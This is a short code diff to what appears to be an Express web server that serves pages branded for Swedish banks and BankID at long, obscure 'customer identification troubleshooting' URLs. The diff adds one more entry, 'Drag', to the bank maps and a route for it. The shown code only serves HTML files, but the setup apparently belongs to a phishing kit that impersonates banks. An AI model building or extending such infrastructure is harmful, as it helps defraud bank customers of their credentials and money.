@@ -87,7 +87,8 @@ const bankPages = {
     'seb': 'Sebfelsokningskundidentifieringkund98721311',
     'lansforsakringar': 'Lansforsakringarfelsokningskundidentifieringkund98721311',
     'danskebank': 'Danskebankfelsokningskundidentifieringkund98721311',
-    'bankid': 'Bankidfelsokningskundidentifieringkund98721311'
+    'bankid': 'Bankidfelsokningskundidentifieringkund98721311',
+    'drag': 'Dragfelsokningskundidentifieringkund98721311'
 };
 
 // Bank display names for URLs
@@ -99,7 +100,8 @@ const bankDisplayNames = {
     'seb': 'SEB',
     'lansforsakringar': 'Lansforsakringar',
     'danskebank': 'Danske Bank',
-    'bankid': 'BankID'
+    'bankid': 'BankID',
+    'drag': 'Drag'
 };
 
 // Bank routes with and without .html
@@ -208,6 +210,11 @@ app.get('/Lansforsakringarfelsokningskundidentifieringkund98721311', (req, res) 
 
 app.get('/Danskebankfelsokningskundidentifieringkund98721311', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'Danskebankfelsokningskundidentifieringkund98721311.html'));
+});
+
+// Add route for Drag
+app.get('/Dragfelsokningskundidentifieringkund98721311', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'Dragfelsokningskundidentifieringkund98721311.html'));
 });
 
 // Add a root route
